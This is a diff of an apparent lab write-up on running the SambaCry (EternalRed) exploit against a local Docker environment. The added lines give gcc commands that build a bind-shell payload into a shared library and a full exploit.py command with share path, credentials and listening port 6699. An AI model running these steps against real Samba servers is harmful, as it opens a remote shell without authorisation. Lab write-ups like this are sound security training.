@@ -102,7 +102,8 @@ Modified code:
     triggerThread.start()
 ```
 
-After this we only have the handler. In case our payload is a bind shell, this handler will conect to it. We can delete this if we want to connect with a different methode.
+After this we only have the handler. In case our payload is a bind shell, this handler will conect to it. We can delete this if we want to connect with a different methode. 
+There is also a test if the exploit was successfull or not. Uname -a will run when the handler extabilish connection.
 
 <h2>Payload<h2>
 Let's check the payload givven for this exploit. This is a bind shell written in C. Looking at the code of bindshell-samba.c we can see a nicely commented code. Without going into much details, the only thing we need to take a look is where the port is set.
@@ -113,4 +114,22 @@ Let's check the payload givven for this exploit. This is a bind shell written in
     hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);
 ```
 
-We can see that the listening port is set to 6699. we can change it anytime. 
+We can see that the listening port is set to 6699. We can change it anytime. 
+Let's comply the payload
+
+```
+gcc -c -fpic bindshell-samba.c
+gcc -shared -o libbindshell-samba.so bindshell-samba.o
+
+```
+
+<h2>All set <h2>
+With that tiny little modification, the exploit is ready to run. By using the given command we can exploit the docker environment.
+
+```
+./exploit.py -t localhost -e libbindshell-samba.so \
+             -s data -r /data/libbindshell-samba.so \
+             -u sambacry -p nosambanocry -P 6699
+
+```
+![firstRun](/img/EternalRed/firstRun.png)
